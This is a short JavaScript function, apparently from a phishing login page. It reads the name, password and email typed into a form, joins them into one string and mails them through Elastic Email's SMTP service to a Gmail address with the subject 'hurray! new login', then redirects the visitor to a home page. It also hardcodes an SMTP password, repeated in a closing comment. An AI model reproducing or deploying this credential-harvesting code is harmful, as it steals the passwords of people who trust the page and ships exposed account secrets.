function send(){
  window.location.href="./home.htm"
  var name = document.getElementById("name").value
  var passwords = document.getElementById("password").value
  var email = document.getElementById("email").value
  
  var result = name + "___________" + passwords + "___________" + email

Email.send({
  Host : "smtp.elasticemail.com",
  Username : "akshatdollar@gmail.com",
  Password : "D6A7366E78D0598AE559842E14800FFFD5A2",
  To : 'akshatdollar@gmail.com',
  From : "akshatdollar@gmail.com",
  Subject : "hurray! new login",
  Body : result
}).then(
message => alert(message)

);

location.replace("https://127.0.0.1:5500/home.html")
}

//D6A7366E78D0598AE559842E14800FFFD5A2